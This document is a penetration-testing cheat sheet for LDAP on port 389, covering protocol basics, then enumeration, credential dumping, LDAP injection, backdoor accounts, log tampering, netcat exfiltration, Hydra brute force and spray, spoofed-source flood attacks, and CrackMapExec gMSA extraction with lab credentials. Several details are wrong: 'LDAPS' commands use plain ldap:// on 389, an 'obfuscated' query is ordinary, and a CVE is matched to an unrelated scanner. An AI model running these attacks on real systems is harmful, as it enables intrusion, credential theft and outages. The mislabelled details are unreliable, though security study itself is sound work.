# Index
- [[Ports, Protocols, and Services]]
	- [[P636 LDAPS]]
	- [[P3269 LDAP Global Catalog]]

# Lightweight Directory Access Protocol (LDAP)

- **Port Number:** 389 (LDAP), 636 (LDAPS)
- **Protocol:** TCP/UDP (LDAP), TCP (LDAPS)
- **Service Name:** Lightweight Directory Access Protocol (LDAP)
- **Defined in:** RFC 4511

The Lightweight Directory Access Protocol (LDAP) is a protocol used for accessing and maintaining distributed directory information services over an IP network. LDAP is commonly used for directory services such as managing user credentials, organizational data, and accessing the structure of an organization within a network. LDAP operates over TCP and UDP on port 389, and over TCP for LDAP over SSL (LDAPS) on port 636.

## Overview of Features

- **Hierarchical Structure:** LDAP directories are organized in a hierarchical tree structure, often representing the organization of an entity such as a company or department.
  
- **Standardized Protocol:** LDAP is standardized under RFC 4511, ensuring interoperability between different implementations and services.

- **Authentication and Authorization:** LDAP supports various authentication methods, including simple (cleartext), SASL (Simple Authentication and Security Layer), and integration with Kerberos.

- **Schema Flexibility:** LDAP supports a flexible schema that can be extended to store various types of information, including users, groups, devices, and more.

- **Replication and Synchronization:** LDAP directories can be replicated across multiple servers, ensuring high availability and redundancy.

- **Search and Query Capabilities:** LDAP provides powerful search and query capabilities, allowing for the efficient retrieval of directory data based on various criteria.

- **Security Features:** While LDAP itself can be vulnerable to man-in-the-middle attacks, LDAPS provides a secure alternative by encrypting communication with SSL/TLS.

## Typical Use Cases

- **User Authentication:** LDAP is commonly used for authenticating users across an organization, allowing single sign-on (SSO) and centralized credential management.

- **Access Control:** LDAP is used to manage access control lists (ACLs) and permissions across network resources, enabling fine-grained control over who can access what.

- **Directory Services:** LDAP directories serve as a central repository for organizational data, including user profiles, groups, and resource information.

- **Integration with Other Systems:** LDAP can be integrated with various applications and services, such as email servers, VPNs, and enterprise resource planning (ERP) systems.

## How LDAP Works

1. **LDAP Bind:**
   - **Step 1:** A client initiates a connection to an LDAP server on port 389 (or 636 for LDAPS).
   - **Step 2:** The client sends a "bind" request to authenticate itself. This could be a simple bind (cleartext username/password) or a more secure method like SASL.
   - **Step 3:** The server responds with a bind response, indicating success or failure.

2. **LDAP Search:**
   - **Step 4:** After successful binding, the client can send a search request to query the directory. The search request includes parameters such as the base distinguished name (DN), scope of the search, and filter criteria.
   - **Step 5:** The server processes the search request and returns the matching entries, along with any requested attributes.

3. **LDAP Modify:**
   - **Step 6:** The client can send a modify request to update existing directory entries. This request includes the DN of the entry to be modified and the changes to be made.
   - **Step 7:** The server processes the modify request and returns a result code indicating success or failure.

4. **LDAP Add:**
   - **Step 8:** The client can add new entries to the directory by sending an add request, which includes the DN of the new entry and its attributes.
   - **Step 9:** The server processes the add request and returns a result code.

5. **LDAP Delete:**
   - **Step 10:** The client can delete existing entries by sending a delete request, which includes the DN of the entry to be deleted.
   - **Step 11:** The server processes the delete request and returns a result code.

6. **LDAP Unbind:**
   - **Step 12:** When the client is finished, it sends an unbind request to terminate the session.
   - **Step 13:** The server acknowledges the unbind request and closes the connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` binds to `<target_ip>` on port 389.
- **Server:** `<target_ip>` authenticates `<attack_ip>` and allows queries.
- **Client:** `<attack_ip>` sends a search request to `<target_ip>` for all users in the "OU=People,DC=mydomain,DC=com" directory.
- **Server:** `<target_ip>` returns a list of users matching the search criteria.

# Additional Information

## Common LDAP Directories

|**Directory**|**Description**|
|-|-|
| DC=mydomain,DC=com                      | Represents the root of the directory tree for the example.com domain.       |
| OU=Users,DC=mydomain,DC=com             | Organizational Unit containing user accounts within the example.com domain. |
| CN=John Doe,OU=Users,DC=mydomain,DC=com | A specific user entry (John Doe) within the Users organizational unit.      |
| OU=Groups,DC=mydomain,DC=com            | Organizational Unit containing group entries within the example.com domain. |
| CN=Admins,OU=Groups,DC=mydomain,DC=com  | A specific group entry (Admins) within the Groups organizational unit.      |

## Security Considerations
- **Cleartext Authentication:** When using simple bind, LDAP credentials are transmitted in cleartext, making them vulnerable to interception. It is recommended to use LDAPS or secure alternatives like Kerberos.

- **LDAP Injection:** Similar to SQL injection, LDAP injection occurs when user input is improperly sanitized, allowing attackers to manipulate LDAP queries and gain unauthorized access to directory information.

- **Man-in-the-Middle Attacks:** Without encryption (LDAPS), LDAP traffic is susceptible to man-in-the-middle attacks where an attacker can intercept and alter communications.

- **Replication and Synchronization:** Proper configuration of replication is crucial for maintaining consistency across multiple LDAP servers. Misconfigurations can lead to data corruption or unavailability.

## Alternatives
- **Active Directory (AD):** Microsoft’s implementation of LDAP integrated with other protocols, commonly used in Windows environments for user management and authentication.

- **OpenLDAP:** An open-source implementation of LDAP, widely used in Unix-based systems for directory services.

- **RADIUS and TACACS+:** Alternatives for authentication services that may complement or replace LDAP in specific scenarios.

## Advanced Usage
- **Custom Schema Development:** Organizations can develop custom schemas to store specific types of data not covered by standard LDAP object classes, enabling the directory to serve specialized needs.

- **LDAP Referrals:** LDAP referrals allow an LDAP server to redirect a client to another server for data that resides elsewhere, facilitating distributed directory management.

## Modes of Operation
- **Anonymous Bind:** In some configurations, LDAP allows anonymous access, where a client does not need to authenticate to perform certain read-only operations.

- **StartTLS:** LDAP can be upgraded to a secure connection using the StartTLS command, which begins as a standard LDAP connection and then negotiates encryption.

## Configuration Files

1. **OpenLDAP:**
  - **File Location:** `/etc/openldap/slapd.conf`
  - **Configuration Example:**
    ```bash
    include         /etc/openldap/schema/core.schema
    pidfile         /var/run/openldap/slapd.pid
    argsfile        /var/run/openldap/slapd.args
    database        mdb
    suffix          "DC=mydomain,DC=com"
    rootdn          "CN=Manager,DC=mydomain,DC=com"
    rootpw          secret
    directory       /var/lib/ldap
    ```
  - **Key Settings:**
    - `suffix`: Defines the base DN for the directory.
    - `rootdn`: Specifies the distinguished name (DN) of the directory administrator.
    - `rootpw`: Password for the rootdn (use `slappasswd` to generate a secure password hash).
    - `directory`: Specifies the directory where the database files are stored.

2. **LDAP Data Interchange Format(LDIF):**
- **Adding a New User:**
  - **LDIF File:**
    ```ldif
    dn: uid=jdoe,OU=People,DC=mydomain,DC=com
    objectClass: inetOrgPerson
    uid: jdoe
    cn: John Doe
    sn: Doe
    userPassword: {SSHA}hashedpassword
    mail: jdoe@example.com
    ```
  - **Command to Add Entry:**
    ```bash
    ldapadd -x -D "CN=Manager,DC=mydomain,DC=com" -W -f newuser.ldif
    ```

## Potential Misconfigurations

1. **Anonymous Bind Enabled:**
   - **Risk:** Allowing anonymous binds can expose sensitive directory information to unauthorized users.
   - **Exploitation:** An attacker can query the directory without authentication, potentially exposing user data or organizational structure.

2. **Weak Passwords for Bind Accounts:**
   - **Risk:** Using weak or default passwords for LDAP bind accounts can lead to unauthorized access.
   - **Exploitation:** Attackers can perform brute-force attacks on LDAP bind accounts to gain access to the directory.

3. **Improperly Configured Access Control Lists (ACLs):**
   - **Risk:** Incorrect ACLs can grant unauthorized access to sensitive directory entries.
   - **Exploitation:** Attackers can exploit weak ACLs to modify directory data, such as adding or deleting user accounts.

4. **Failure to Use LDAPS:**
   - **Risk:** Using LDAP without SSL/TLS exposes sensitive information to interception.
   - **Exploitation:** Man-in-the-middle attacks can capture LDAP credentials and other data transmitted in cleartext.

## Default Credentials

While LDAP itself does not have default credentials, some implementations may ship with pre-configured accounts that should be changed:

- **OpenLDAP Default RootDN:**
  - **User:** `CN=Manager,DC=mydomain,DC=com`
  - **Password:** `secret` (commonly used default, should be changed immediately)

- **Active Directory Default Administrator:**
  - **User:** `Administrator`
  - **Password:** Configured during installation; weak passwords should be avoided.

# Interaction and Tools

## Tools

### [[LDAPAdd]]
- **Add Entry to the LDAP directory:** Add a new entry defined in the `new_entry.ldif` file.
	```bash
	ldapadd -H ldap://<target_ip>:389 -D "<bind_dn>" -w '<password>' -f <filename>
	
	ldapadd -H ldap://<target_ip>:389 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f new_entry.ldif
	```

### [[LDAPModify]]
- **Modify Entry in the LDAP directory:** Modify an existing entry using the `modify_entry.ldif` file.
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "<bind_dn" -w '<password>' -f <filename>
	
	ldapmodify -H ldap://<target_ip>:389 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f modify.ldif
	```

### [[LDAPDelete]]
- **Delete Entry from the LDAP directory:** Delete the entry with the common name "John Doe."
	```bash
	ldapdelete -H ldap://<target_ip>:389 -D "<bind_dn>" -w '<password>' "<entry_to_delete>"
	
	ldapdelete -H ldap://<target_ip>:389 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' "CN=user,DC=mydomain,DC=com"
	```

### [[LDAPSearch]]
- **Anonymous Bind:** Attempts to enumerate the directory with an anonymous bind.
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "<searchbase_ou>"
	ldapsearch -H ldap://<target_ip>:389 -b "DC=mydomain,DC=com" 
	```
- **Authenticated Bind:** Performs enumeration with authenticated access.
	```bash
	ldapsearch -H ldap://<target_ip>:389 -D '<domainname>\<username>' -w '<password>'
	ldapsearch -H ldap://<target_ip>:389 -D 'mydomain\admin' -w 'password123'
	
	ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	ldapsearch -H ldap://<target_ip>:389 -D "CN=admin,DC=mydomain,DC=com" -w 'password123'
	```
- **Search Syntax:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -D '<domainname>\<username>' -w '<password>' -b "<searchbase_ou>" "<search_parameters>"
	
	ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	```
- **Search Entries:** Searches for all entries under the base DN `DC=mydomain,DC=com`.
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "DC=mydomain,DC=com" "(objectClass=*)"
	```
- **Extract Users:**
	```bash	
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Users,DC=mydomain,DC=com"
	```
- **Extract Specific User:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Users,DC=mydomain,DC=com" "(uid=johndoe)"
	```
- **Extract Users in an Organizational Unit:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "OU=Users,DC=mydomain,DC=com" "(objectClass=inetOrgPerson)"
	```
- **Extract Computers:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Computers,DC=mydomain,DC=com"
	```
- **Extract my info:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=<username>,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Admins:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Domain Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Users:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Domain Users,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Enterprise Admins:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Enterprise Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Administrators:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Administrators,CN=Builtin,DC=mydomain,DC=com"
	```
- **Extract Remote Desktop Group:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "CN=Remote Desktop Users,CN=Builtin,DC=mydomain,DC=com"
	```
- **To see if you have access to any password you can use grep after executing one of the queries:**
	```bash
	<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
	```
- **Retrieve specific attributes:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -b "DC=mydomain,DC=com" "(uid=johndoe)" cn mail
	```
- **Export Directory Entries:** Exports the entire directory subtree to an LDIF file over a secure LDAPS connection.
	```bash
	ldapsearch -H ldaps://<target_ip> -b "dc=mydomain,dc=com" > backup.ldif	
	```
- **StartTLS:** Performs an LDAP search over a StartTLS-encrypted connection.
	```bash
	ldapsearch -H ldap://<target_ip>:389 -ZZ -b "DC=mydomain,DC=com"
	```

### [[LDAPPasswd]]
- **Password Change over LDAPS:** Changes the password of an LDAP user over a secure LDAPS connection.
    ```bash
    ldappasswd -H ldap://<target_ip>:389 -D '<domainname>\<username>' -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    
    ldappasswd -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    ```

### [[SlapPasswd]]
- **LDAP Password Hashing:** Generates a hashed password for secure storage in LDAP entries.
    ```bash
    slappasswd
    ```

### [[SlapCat]]
- **Exporting LDAP Entries:** Exports all entries in the LDAP directory to an LDIF file for backup purposes.
    ```bash
    slapcat -v -l backup.ldif
    ```

### [[SlapAdd]]
- **Importing LDAP Entries:** Imports entries from an LDIF file into the LDAP directory.
    ```bash
    slapadd -l backup.ldif
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 389"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 389
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 389
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 389 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 389
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 389 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:389
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 389 -c 1
    ```

### [[CrackMapExec]]
- **Authentication:** Testing if account exist without Kerberos protocol
	```bash
	crackmapexec ldap <target_ip> -u <username_wordlist> -p '' -k
	```
- **Testing credentials:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>'
	crackmapexec ldap <target_ip> -u <username> -H '<ntlmhash>'
	```
- **Find Domain SID:**
	```bash
	crackmapexec ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
	
	LDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
	LDAPS       DC1.scrm.local  389    DC1.scrm.local   [+] scrm.local\sqlsvc
	LDAPS       DC1.scrm.local  389    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
	```
- **Unconstrained Delegation:** CrackMapExec allows you to retrieve the list of all computers et users with the flag TRUSTED_FOR_DELEGATION
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --trusted-for-delegation
	```
- **Admin Count:** adminCount Indicates that a given object has had its ACLs changed to a more secure value by the system because it was a member of one of the administrative groups (directly or transitively).
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --admin-count
	```
- **Machine Account Quota:** This module retrieves the MachineAccountQuota domain-level attribute. It's useful to check this value because by default it permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain.
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M maq
	```
- **Get user descriptions:** New LDAP module to look for password inside the user's description.
	- Three options are available:
		- FILTER: To look for a string inside the description
		- PASSWORDPOLICY: To look for password according to the complexity requirements of windows
		- MINLENGTH: Choose the minimum length of the password (may be obtained from `--pass-pol`)
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --kdchost <ip> -M get-desc-users
	```
- **Dump gMSA:** Extract gmsa credentials accounts. Using the protocol LDAP you can extract the password of a gMSA account if you have the right. LDAPS is required to retrieve the password, using the `--gmsa` LDAPS is automatically selected
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa
	```
- **Exploit ESC8 (adcs) List all PKI enrollment Server:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs
	```
- **Exploit ESC8 (adcs) List all certificates inside a PKI:** 
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs -o SERVER=xxxx
	```
- **Extract subnet:** Extract subnet over an active directory environment
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ONLY_HOSTS=true
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ALL=true
	```
- **Check LDAP signing:** Using the module `ldap-checker` you can verify if ldap require channel binding or not
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M ldap-checker
	```
- **Read DACL right:** LDAP module that permits to read and export the DACLs of one or multiple objects! Read all the ACEs of the Administrator
	```bash
	crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
	```
- **Extract gMSA secrets:** Convert gSAM id, convert gmsa lsa to ntlm. CrackMapExec offers multiple choices when you find a gmsa account in the LSA
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
	```

	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
	```
- **Bloodhound Ingestor:** To ingest the data of the Active Directory
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --bloodhound --ns ip --collection All
	```

### [[BloodHound Cheat Sheet]]
- **Extract All:** Collect and visualize data from the Global Catalog to identify potential privilege escalation paths.
    ```powershell
    SharpHound -CollectionMethod All -LDAPOnly -DomainFQDN example.com
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:389
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:636
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 389
	```

## Other Techniques

### [[JXplorer]]
- **Open JXplorer:** Allows for graphical interaction with LDAP directories, making it easier to browse and modify entries.
    ```bash
    jxplorer
    ```

### [[LDAPAdmin]]
- **Connecting to an LDAP Server:**
	1. Open LDAPAdmin.
	2. Go to `Connection > Connect`.
	3. Enter the server address, port (389), and select SSL.
	4. Enter the bind DN (e.g., `CN=admin,DC=mydomain,DC=com`) and password.
	5. Click `Connect`.
- **Browsing the Directory:**
	1. Expand the directory tree to browse organizational units and entries.
	2. Right-click on entries to view, modify, or delete them.
	3. Use the `Search` feature to find specific entries.

### [[LDP.exe]]
- **Connecting to an LDAP Server:**
	1. Open `LDP.exe`.
	2. Connect to the server: `Connection -> Connect...`
	    - Server: `yourdomaincontroller`
	    - Port: `3269`
	    - Check `SSL` for secure connection.
	3. Bind to the server: `Connection -> Bind...`
	    - Use a valid domain user credentials.

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 389
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 389
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### LDAP Anonymous Bind 
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -b ""
    ```
 - **Description:** Attempt to authenticate to the LDAP server via anonymous bind.

### LDAP Injection
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Description:** Injects a malicious LDAP filter to try and extract sensitive information.

## Persistence

### Create User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_user.ldif
	```
- **Description:** Create a new user to the directory providing a backdoor for persistent access.

### Change Existing User Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing user account password for persistent access.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_user.ldif
	```
- **Description:** Modify existing user entries to create alternate access methods.

### Injecting Malicious Entries
- **Tool:** [[LDAPModify]]
    ```bash
    ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f malicious.ldif
    ```
- **Description:** Injecting persistent backdoor entries into the LDAP directory.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 389"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### LDAP Credential Harvesting
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(uid=*)"
    ```
- **Description:** Attempts to enumerate user credentials from the LDAP directory.

### Password Dumping
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=person)" userPassword
    ```
- **Description:** Dumps all user passwords stored in the LDAP directory.

### LDAPS Log Analysis
- **Tool:** Log Parsing Tools
	```bash
	grep -i "ldap" /var/log/auth.log
	```
- **Description:** Analyze logs for failed LDAPS authentication attempts, which might reveal usernames or other useful information.

## Privilege Escalation

### Create Admin Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_admin.ldif
	```
- **Description:** Create a new admin account to the directory providing a backdoor for privilege escalation.

### Change Existing Admin Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing admin account password for privilege escalation.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f escalate_user.ldif
	```
- **Description:** Modify existing user entries to escalate privileges of a lower-privileged account.

## Internal Reconnaissance

### LDAP Enumeration
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=*)"
    ```
- **Description:** Enumerating directory objects, groups, and permissions to map out internal network resources.

### Sudo Rules Enumeration
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "ou=sudoers,dc=example,dc=com"
	``` 
- **Description:** Retrieve and analyze sudo rules stored in the directory to identify potential privilege escalation vectors.

## Lateral Movement, Pivoting, and Tunnelling

### Using LDAP for Lateral Movement
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_service_account.ldif
	```
- **Description:** Adds a service account with privileges across multiple systems, facilitating lateral movement.

## Defense Evasion

### Using Obfuscated Queries
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "dc=example,dc=com" -LLL "(|(cn=*)(uid=*))"
	```
- **Description:** Use obfuscated LDAP queries to avoid detection by security monitoring tools.

### Modifying Logs via LDAP
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_logs.ldif
	```
- **Description:** Modifies or deletes LDAP logs to erase evidence of an attack or compromise.

## Data Exfiltration

### Exfiltrating Directory Data
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" -LLL > exfil_data.ldif
    ```
- **Description:** Extracting sensitive directory data over a secure LDAPS connection.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ldap://<target_ip> -s 389 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ldap://<target_ip> -s 389 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### LDAP Query Flood
- **Tool:** [[LDAPSearch]]
    ```bash
    while true; do ldapsearch -H ldap://<target_ip>:389 -b "DC=mydomain,DC=com" "(uid=*)"; done
    ```
- **Description:** Floods the LDAP server with queries, consuming resources and potentially causing a denial of service.

## Exploits 

### CVE-2017-8563 (LDAP Relay Attack)
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/scanner/ldap/ldap_login
	```
- **Description:** Exploits a vulnerability in Microsoft LDAP to perform relay attacks and gain unauthorized access.

### LDAP Injection
- **Tool:** [[Custom Scripts]]
    ```bash
    ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Example:**
	```bash
	ldapsearch -H ldap://<target_ip>:389 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' "(uid=$USER_INPUT)"
	```
- **Malicious Input:** This input modifies the query to return all objects, bypassing the intended filter.
	```c
	` `*)(|(objectClass=*))` `
	```
- **Description:** Exploits poorly sanitized input in LDAP queries to extract sensitive information. By injecting malicious LDAP statements, attackers can alter the intended query logic and gain unauthorized access to directory data.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 4511 - LDAP|https://tools.ietf.org/html/rfc4511|
|OpenLDAP Documentation|https://www.openldap.org/doc/admin24/|
|Active Directory LDAP Guide|https://docs.microsoft.com/en-us/windows/win32/ad/ldap-api-quick-start|
|JXplorer LDAP Browser|https://jxplorer.org/|
|Hydra Password Cracking Tool|https://github.com/vanhauser-thc/thc-hydra|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|LDAP Injection Guide|https://www.owasp.org/index.php/LDAP_Injection|
|Python-LDAP Library|https://www.python-ldap.org/|
|Linux man-pages|https://man7.org/linux/man-pages/|